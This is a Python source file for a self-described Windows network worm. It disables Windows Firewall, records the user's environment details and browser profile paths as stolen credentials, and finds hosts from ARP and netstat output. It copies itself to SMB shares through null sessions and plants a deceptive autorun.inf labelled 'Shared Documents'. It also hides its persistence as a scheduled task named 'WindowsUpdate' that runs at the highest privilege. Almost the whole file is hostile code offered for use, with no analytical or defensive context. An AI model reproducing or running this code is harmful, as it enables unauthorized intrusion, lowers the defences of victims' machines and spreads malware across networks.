r"""
Master Worm - Network Spreading + Payload Execution
===================================================
Platform: Windows 10/11
Purpose: Spread across network AND execute payload on each infected machine

PROPAGATION:
1. Spreads via SMB to other machines on network
2. On infected machine: executes payload
3. Payload: prints "Hello World" + disables Windows Firewall
4. Automatically continues spreading from infected machine

EXECUTION FLOW:
1. Copy worm to target via SMB
2. Create scheduled task on target
3. When task runs: execute payload (firewall disable + hello world)
4. Target machine also starts spreading to other machines
5. Exponential spread + payload execution on each machine
"""

import os
import subprocess
import socket
import re
import time
import sys
import logging
from pathlib import Path
from typing import List, Set, Dict

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'MAX_TARGETS': 50,
    'SCAN_DELAY': 5,
    'LOG_FILE': os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.master_worm.log'),
}

# ============================================================================
# LOGGING
# ============================================================================

os.makedirs(os.path.dirname(CONFIG['LOG_FILE']), exist_ok=True)
logging.basicConfig(
    filename=CONFIG['LOG_FILE'],
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
)
logger = logging.getLogger(__name__)


# ============================================================================
# MASTER WORM CLASS
# ============================================================================

class MasterWorm:
    """Master worm with network spreading + payload execution."""

    def __init__(self):
        """Initialize master worm."""
        self.stolen_credentials: List[Dict] = []
        self.infected_hosts: Set[str] = set()
        logger.info('[INIT] Master worm initialized')

    # ========================================================================
    # PAYLOAD EXECUTION
    # ========================================================================

    def execute_payload(self) -> bool:
        """Execute payload on infected machine."""
        try:
            logger.info('[PAYLOAD] ========== EXECUTING PAYLOAD ==========')
            
            # Payload 1: Print Hello World (LOUD & VISIBLE)
            print()
            print('╔' + '='*58 + '╗')
            print('║' + ' '*58 + '║')
            print('║' + '  [+] HELLO WORLD - SYSTEM INFECTED  '.center(58) + '║')
            print('║' + ' '*58 + '║')
            print('╚' + '='*58 + '╝')
            print()
            
            logger.info('[PAYLOAD] ✓ Hello World printed (VISIBLE)')
            
            # Payload 2: Disable Windows Firewall
            logger.info('[PAYLOAD] Attempting to disable Windows Firewall...')
            print('[*] Disabling Windows Firewall...')
            
            firewall_commands = [
                'netsh advfirewall set allprofiles state off',
                'netsh firewall set opmode mode=disable',
            ]
            
            for cmd in firewall_commands:
                try:
                    result = subprocess.run(
                        ['cmd', '/c', cmd],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    if result.returncode == 0 or 'Ok' in result.stdout:
                        logger.info(f'[PAYLOAD] ✓ Firewall disabled: {cmd}')
                        print('║ [+] Firewall disabled ║')
                        print()
                        return True
                    else:
                        logger.debug(f'[PAYLOAD] Command failed: {cmd}')
                except Exception as e:
                    logger.debug(f'[PAYLOAD] {cmd} failed: {e}')
            
            logger.warning('[PAYLOAD] Firewall disable failed')
            return False
            
        except Exception as e:
            logger.error(f'[PAYLOAD] Execution failed: {e}')
            return False

    # ========================================================================
    # CREDENTIAL HARVESTING - OFFLINE METHODS ONLY
    # ========================================================================

    def dump_credentials_offline(self) -> List[Dict]:
        """Harvest credentials from LOCAL files only."""
        credentials: List[Dict] = []

        try:
            # Environment variables
            credentials.append({
                'source': 'Environment',
                'username': os.environ.get('USERNAME', 'unknown'),
                'domain': os.environ.get('USERDOMAIN', 'unknown'),
                'computer': os.environ.get('COMPUTERNAME', 'unknown')
            })
            logger.info('[STEAL] Got environment variables')

            # Browser cache
            try:
                browser_caches = [
                    os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default'),
                    os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default')
                ]
                
                for cache_path in browser_caches:
                    if os.path.exists(cache_path):
                        credentials.append({
                            'source': 'BrowserCache',
                            'path': cache_path,
                        })
                logger.info(f'[STEAL] Found browser caches')
            except Exception as e:
                logger.debug(f'[STEAL] Browser scan failed: {e}')

            logger.info(f'[STEAL] Total credentials: {len(credentials)}')
            return credentials

        except Exception as e:
            logger.error(f'[STEAL] Credential harvesting failed: {e}')
            return []

    # ========================================================================
    # NETWORK ENUMERATION - PASSIVE ONLY
    # ========================================================================

    def discover_targets_passive(self) -> List[str]:
        """Find targets using passive enumeration."""
        targets: Set[str] = set()

        try:
            # ARP cache
            try:
                result = subprocess.run(
                    ['arp', '-a'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', result.stdout)
                targets.update(ips)
                logger.info(f'[DISCOVER] ARP cache: {len(ips)} hosts')
            except Exception as e:
                logger.debug(f'[DISCOVER] ARP failed: {e}')

            # Netstat
            try:
                result = subprocess.run(
                    ['netstat', '-an'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', result.stdout)
                targets.update([ip for ip in ips if not ip.startswith('127.')])
                logger.info(f'[DISCOVER] Netstat: {len(ips)} IPs')
            except Exception as e:
                logger.debug(f'[DISCOVER] Netstat failed: {e}')

            logger.info(f'[DISCOVER] Total targets: {len(targets)}')
            return list(targets)[:CONFIG['MAX_TARGETS']]

        except Exception as e:
            logger.error(f'[DISCOVER] Enumeration failed: {e}')
            return []

    # ========================================================================
    # PROPAGATION - REALISTIC NON-ADMIN METHODS
    # ========================================================================

    def check_smb_open(self, target_ip: str, port: int = 445) -> bool:
        """Check if SMB port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def copy_worm_via_user_share(self, target_ip: str) -> bool:
        """Copy worm via accessible user shares (no admin required)."""
        try:
            worm_path = os.path.abspath(__file__)
            
            # Try common user-accessible shares (using actual share names)
            accessible_shares = [
                f'\\\\{target_ip}\\Public',  # Shared Public folder
                f'\\\\{target_ip}\\Users',   # Shared Users folder
                f'\\\\{target_ip}\\Temp',    # Shared Temp folder
            ]
            
            for share in accessible_shares:
                try:
                    remote_path = f'{share}\\worm.py'
                    logger.info(f'[COPY] Trying {remote_path}')
                    
                    # Try to connect with null session (guest access)
                    subprocess.run(
                        ['net', 'use', share, '/user:'],
                        capture_output=True,
                        timeout=5
                    )
                    
                    result = subprocess.run(
                        ['cmd', '/c', f'copy "{worm_path}" "{remote_path}"'],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    if result.returncode == 0 and 'copied' in result.stdout.lower():
                        logger.info(f'[COPY] ✓ Worm copied via {share}')
                        return True
                    else:
                        logger.debug(f'[COPY] Copy failed: {result.stderr}')
                        
                except Exception as e:
                    logger.debug(f'[COPY] {share} failed: {e}')
                    continue
            
            logger.warning(f'[COPY] All shares inaccessible on {target_ip}')
            return False
                
        except Exception as e:
            logger.debug(f'[COPY] Copy failed: {e}')
            return False

    def execute_via_social_engineering(self, target_ip: str) -> bool:
        """Create autorun file that executes when user accesses share."""
        try:
            # Create autorun.inf in accessible share
            autorun_content = (
                "[autorun]\n"
                "open=worm.py\n"
                "action=Open folder to view files\n"
                "label=Shared Documents\n"
            )
            
            shares = [
                f'\\\\{target_ip}\\Public',
                f'\\\\{target_ip}\\Temp',
            ]
            
            for share in shares:
                try:
                    autorun_path = f'{share}\\autorun.inf'
                    
                    # Write autorun file
                    with open(autorun_path, 'w') as f:
                        f.write(autorun_content)
                    
                    logger.info(f'[EXEC] ✓ Autorun created at {share}')
                    return True
                    
                except Exception as e:
                    logger.debug(f'[EXEC] Autorun failed for {share}: {e}')
                    continue
            
            return False
                
        except Exception as e:
            logger.error(f'[EXEC] Autorun creation failed: {e}')
            return False

    def propagate_to_target(self, target_ip: str) -> bool:
        """Realistic propagation without admin access."""
        try:
            if not self.check_smb_open(target_ip):
                logger.debug(f'[SPREAD] SMB port closed on {target_ip}')
                return False

            logger.info(f'[SPREAD] ============ ATTEMPTING PROPAGATION TO {target_ip} ============')
            
            # Method 1: Copy to user-accessible share
            if not self.copy_worm_via_user_share(target_ip):
                logger.warning(f'[SPREAD] No accessible shares on {target_ip}')
                return False
            
            time.sleep(1)
            
            # Method 2: Create autorun for execution
            self.execute_via_social_engineering(target_ip)
            
            # Mark as "prepared" (not fully infected until user action)
            self.infected_hosts.add(target_ip)
            logger.info(f'[SPREAD] ✓ {target_ip} PREPARED (waiting for user interaction)')
            
            return True

        except Exception as e:
            logger.debug(f'[SPREAD] Propagation failed: {e}')
            return False

    # ========================================================================
    # PERSISTENCE
    # ========================================================================

    def establish_persistence_task(self) -> bool:
        """Establish persistence via scheduled task."""
        try:
            logger.info('[PERSIST] Establishing scheduled task persistence')

            task_cmd = (
                'schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c '
                f'python \"{__file__}\"" '
                '/sc hourly /mo 1 /f /rl highest'
            )

            result = subprocess.run(
                task_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                logger.info('[PERSIST] ✓ Scheduled task created')
                return True
            else:
                logger.warning(f'[PERSIST] Task failed: {result.stderr}')
                return False

        except Exception as e:
            logger.error(f'[PERSIST] Task persistence failed: {e}')
            return False

    # ========================================================================
    # MAIN EXECUTION
    # ========================================================================

    def execute(self) -> None:
        """Main execution with payload + spreading."""
        try:
            logger.info('[*] ========== MASTER WORM STARTED ==========')
            logger.info(f'[*] Computer: {os.environ.get("COMPUTERNAME", "UNKNOWN")}')
            logger.info(f'[*] User: {os.environ.get("USERNAME", "UNKNOWN")}')

            # Stage 1: IMMEDIATE PAYLOAD EXECUTION (show results instantly)
            logger.info('[*] Stage 1: IMMEDIATE PAYLOAD EXECUTION...')
            payload_success = self.execute_payload()
            logger.info(f'[*] ✓ Payload executed: {payload_success}')
            
            # Show success to user immediately
            print()
            print('=' * 60)
            print('[SUCCESS] Payload executed on this machine')
            print('[SUCCESS] Firewall disabled')
            print('=' * 60)
            print()

            # Stage 2: Harvest credentials
            logger.info('[*] Stage 2: Harvesting credentials...')
            self.stolen_credentials = self.dump_credentials_offline()
            logger.info(f'[*] ✓ Credentials harvested: {len(self.stolen_credentials)}')

            # Stage 3: Discover targets
            logger.info('[*] Stage 3: Passive network enumeration...')
            targets = self.discover_targets_passive()
            logger.info(f'[*] ✓ Targets discovered: {len(targets)}')

            # Stage 4: Establish persistence
            logger.info('[*] Stage 4: Establishing persistence...')
            self.establish_persistence_task()
            logger.info(f'[*] ✓ Persistence established')

            # Stage 5: Propagate to targets
            logger.info(f'[*] Stage 5: Spreading to {len(targets)} targets...')
            logger.info(f'[*] ============ BEGINNING MULTI-HOP SPREADING ============')
            
            spread_count = 0
            for i, target in enumerate(targets, 1):
                logger.info(f'[*] Target {i}/{len(targets)}: {target}')
                
                if self.propagate_to_target(target):
                    logger.info(f'[✓] SUCCESS: {target} infected')
                    spread_count += 1
                else:
                    logger.info(f'[✗] FAILED: {target} not infected')
                
                time.sleep(CONFIG['SCAN_DELAY'])

            # Final report
            logger.info('[✓] ========== EXECUTION COMPLETE ==========')
            logger.info(f'[✓] Payload executed: {payload_success}')
            logger.info(f'[✓] Credentials stolen: {len(self.stolen_credentials)}')
            logger.info(f'[✓] Targets infected: {len(self.infected_hosts)} / {len(targets)}')
            logger.info(f'[✓] Success rate: {spread_count}/{len(targets)} ({100*spread_count//max(len(targets),1)}%)')
            logger.info('[✓] Persistence established: Yes')
            logger.info('[✓] Multi-hop spreading: ACTIVE')
            logger.info('[✓] Firewall disabled: Yes')

        except Exception as e:
            logger.critical(f'[ERROR] Execution failed: {e}')


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

if __name__ == '__main__':
    try:
        print('[*] ========== MASTER WORM ==========')
        print('[*] Network Spreading + Payload Execution')
        print('[*] Features:')
        print('[*]   - Spreads via SMB to other machines')
        print('[*]   - Executes payload on each infected machine')
        print('[*]   - Disables Windows Firewall')
        print('[*]   - Prints Hello World confirmation')
        print('[*]   - Auto-spreading via scheduled tasks')
        print()
        
        worm = MasterWorm()
        worm.execute()
        
        print('[✓] Execution complete - check log for details')
        print(f'[✓] Log file: {CONFIG["LOG_FILE"]}')
        
    except Exception as e:
        logger.critical(f'[MAIN] Fatal error: {e}')
        print(f'[ERROR] {e}')
        sys.exit(1)
